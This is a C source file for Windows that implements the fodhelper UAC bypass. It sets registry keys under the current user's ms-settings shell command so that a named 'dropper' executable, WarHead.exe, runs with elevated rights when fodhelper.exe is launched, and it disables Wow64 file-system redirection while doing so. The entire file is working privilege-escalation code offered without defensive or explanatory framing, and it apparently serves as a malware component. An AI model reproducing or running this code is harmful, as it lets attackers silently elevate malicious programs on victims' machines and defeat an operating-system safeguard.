
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>

int main() {
    const char* dropperName = "WarHead.exe"; // must be in the same folder

    char exePath[MAX_PATH] = { 0 };
    if (!GetFullPathNameA(dropperName, MAX_PATH, exePath, NULL)) {
        printf("[!] Failed to resolve dropper path. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] Dropper path: %s\n", exePath);

    char regCmd1[MAX_PATH * 4];
    char regCmd2[MAX_PATH * 4];

    snprintf(regCmd1, sizeof(regCmd1),
        "REG ADD \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /f /ve /t REG_SZ /d \"\\\"%s\\\"\"",
        exePath);

    snprintf(regCmd2, sizeof(regCmd2),
        "REG ADD \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /f /v \"DelegateExecute\" /t REG_SZ /d \"\"");

    printf("[*] Setting registry keys for UAC bypass...\n");
    system(regCmd1);
    system(regCmd2);

    printf("[*] Launching fodhelper.exe using ShellExecuteA() with Wow64 redirection disabled...\n");

    PVOID oldValue = NULL;
    BOOL redirDisabled = Wow64DisableWow64FsRedirection(&oldValue);

    const char* fodPath = "C:\\Windows\\System32\\fodhelper.exe";
    HINSTANCE hRes = ShellExecuteA(NULL, "open", fodPath, NULL, NULL, SW_SHOWNORMAL);

    if (redirDisabled) {
        Wow64RevertWow64FsRedirection(oldValue);
    }

    if ((UINT_PTR)hRes <= 32) {
        printf("[!] ShellExecuteA failed to launch fodhelper.exe. Error code: %ld\n", (UINT_PTR)hRes);
        return 1;
    }

    printf("[+] ShellExecuteA succeeded. Dropper should run elevated.\n");
    return 0;
}
